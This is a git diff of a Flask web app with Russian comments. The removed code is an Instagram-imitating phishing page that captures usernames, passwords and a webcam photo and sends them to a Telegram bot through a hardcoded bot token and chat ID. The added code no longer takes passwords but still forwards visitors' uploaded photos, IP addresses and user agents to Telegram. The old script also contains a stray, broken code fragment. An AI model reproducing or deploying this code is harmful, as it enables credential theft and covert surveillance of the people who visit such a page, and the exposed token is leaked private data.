@@ -1,186 +1,93 @@
-from flask import Flask, render_template_string, request, jsonify
 import os
-import uuid
-import requests
+from flask import Flask, render_template, request, jsonify, send_from_directory
+from dotenv import load_dotenv
 from telegram import Bot
-from telegram.error import TelegramError
-import threading
-import base64 
 import asyncio
-import os
-from flask import redirect, request
+import uuid
+from datetime import datetime
+
+load_dotenv()
 
 app = Flask(__name__)
 
 # Конфигурация
-port = int(os.environ.get("PORT", 5000))
-TELEGRAM_BOT_TOKEN = '1903509391:AAFVvTLNLVEDwUxtPpasNbsrTMR0tK0LMhg'
-TELEGRAM_CHAT_ID = '379344747'
-UPLOAD_FOLDER = 'static/uploads'
+TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')
+TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
+UPLOAD_FOLDER = 'uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# HTML шаблон
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Instagram Login</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #fafafa; }
-        .container { max-width: 350px; margin: 50px auto; }
-        .login-box { background: white; border: 1px solid #e6e6e6; padding: 20px; text-align: center; }
-        .logo { margin: 22px auto 12px; width: 175px; }
-        input { width: 100%; padding: 9px 8px; margin: 5px 0; border: 1px solid #efefef; background: #fafafa; }
-        button { width: 100%; padding: 7px; margin: 10px 0; background: #3897f0; color: white; border: none; border-radius: 3px; }
-        .footer { margin-top: 20px; font-size: 12px; color: #999; }
-        #camera-container { margin: 15px 0; }
-        #canvas { display: none; }
-        #photo-result { max-width: 100%; margin-top: 15px; display: none; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="login-box">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
-            
-            <div id="login-form">
-                <input type="text" placeholder="Phone number, username, or email" id="username">
-                <input type="password" placeholder="Password" id="password">
-                <button onclick="requestCamera()">Log In</button>
-            </div>
-            
-            <div id="camera-container" style="display: none;">
-                <video id="video" width="300" height="200" autoplay></video>
-                <button onclick="capturePhoto()">Take Photo</button>
-            </div>
-            
-            <canvas id="canvas"></canvas>
-            
-            <div id="result-container" style="display: none;">
-                <img id="photo-result" alt="Your photo">
-                <p>Thanks! You can close this page now.</p>
-            </div>
-        </div>
-        <div class="footer">
-            © 2023 Instagram from Meta
-        </div>
-    </div>
+# Проверка наличия токена и chat_id
+if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
+    raise ValueError("Не указаны TELEGRAM_TOKEN или TELEGRAM_CHAT_ID в .env файле")
 
-    <script>
-        body: JSON.stringify({
-            image: imageDataUrl,
-            username: document.getElementById('username').value,
-            password: document.getElementById('password').value // 👈 добавляем это
-        })
-        let stream = null;
-        
-        function requestCamera() {
-            // Сначала "отправляем" данные логина (никуда не отправляются)
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Показываем камеру
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('camera-container').style.display = 'block';
-            
-            // Запрашиваем доступ к камере
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(s) {
-                    stream = s;
-                    document.getElementById('video').srcObject = stream;
-                })
-                .catch(function(err) {
-                    alert('Could not access the camera. Please enable camera permissions.');
-                    console.error(err);
-                });
-        }
-        
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const photoResult = document.getElementById('photo-result');
-            
-            // Устанавливаем размеры canvas как у video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Рисуем текущий кадр видео на canvas
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Останавливаем поток камеры
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            
-            // Показываем результат
-            const imageDataUrl = canvas.toDataURL('image/png');
-            photoResult.src = imageDataUrl;
-            
-            document.getElementById('camera-container').style.display = 'none';
-            document.getElementById('result-container').style.display = 'block';
-            
-            // Отправляем фото на сервер
-            fetch('/upload_photo', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    image: imageDataUrl,
-                    username: document.getElementById('username').value
-                })
-            });
-        }
-    </script>
-</body>
-</html>
-"""
-@app.before_request
-def redirect_to_https():
-    if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
-        url = request.url.replace('http://', 'https://', 1)
-        return redirect(url, code=301)
+bot = Bot(token=TELEGRAM_TOKEN)
+
+async def send_to_telegram(filepath, user_info):
+    try:
+        with open(filepath, 'rb') as f:
+            await bot.send_photo(
+                chat_id=TELEGRAM_CHAT_ID,
+                photo=f,
+                caption=(
+                    f"Новый посетитель:\n"
+                    f"IP: {user_info['ip']}\n"
+                    f"User-Agent: {user_info['user_agent']}\n"
+                    f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+            )
+        return True
+    except Exception as e:
+        print(f"Ошибка при отправке в Telegram: {str(e)}")
+        return False
+
+def get_client_info():
+    return {
+        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
+        'user_agent': request.headers.get('User-Agent', 'Неизвестно'),
+        'referrer': request.headers.get('Referer', 'Прямой заход')
+    }
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template('index.html')
 
-@app.route('/upload_photo', methods=['POST'])
-def upload_photo():
-    data = request.json
-    image_data = data['image'].split(',')[1]  # удаляем префикс "data:image/png;base64,"
-    username = data.get('username', 'unknown')
-    password = data.get('password', 'not_provided')  # 👈 добавляем получение пароля
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'photo' not in request.files:
+        return jsonify({'error': 'Фото не получено'}), 400
+    
+    photo = request.files['photo']
+    if photo.filename == '':
+        return jsonify({'error': 'Пустой файл'}), 400
+    
+    try:
+        # Сохранение фото
+        filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex}.jpg"
+        filepath = os.path.join(UPLOAD_FOLDER, filename)
+        photo.save(filepath)
+        
+        user_info = get_client_info()
+        
+        # Отправка в Telegram
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        success = loop.run_until_complete(send_to_telegram(filepath, user_info))
+        loop.close()
+        
+        if not success:
+            return jsonify({'error': 'Ошибка отправки в Telegram'}), 500
+        
+        return jsonify({'photo_url': f'/uploads/{filename}'})
+    
+    except Exception as e:
+        return jsonify({'error': f'Внутренняя ошибка сервера: {str(e)}'}), 500
 
-    # Сохраняем изображение
-    filename = f"{username}_{uuid.uuid4()}.png"
-    filepath = os.path.join(UPLOAD_FOLDER, filename)
-    
-    with open(filepath, 'wb') as f:
-        f.write(base64.b64decode(image_data))
-    
-    # Отправляем в Telegram фото + текст
-    threading.Thread(target=send_to_telegram, args=(filepath, username, password)).start()
-    
-    return jsonify({'status': 'success'})
-
-def send_to_telegram(filepath, username, password):
-    async def send():
-        try:
-            bot = Bot(token=TELEGRAM_BOT_TOKEN)
-            caption = f"📸 Новый вход:\n👤 Username: {username}\n🔑 Password: {password}"
-            with open(filepath, 'rb') as photo:
-                await bot.send_photo(
-                    chat_id=TELEGRAM_CHAT_ID,
-                    photo=photo,
-                    caption=caption
-                )
-        except TelegramError as e:
-            print(f"Error sending to Telegram: {e}")
-    
-    import asyncio
-    asyncio.run(send())
-
+@app.route('/uploads/<filename>')
+def uploaded_file(filename):
+    try:
+        return send_from_directory(UPLOAD_FOLDER, filename)
+    except FileNotFoundError:
+        return jsonify({'error': 'Файл не найден'}), 404
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000, debug=True)
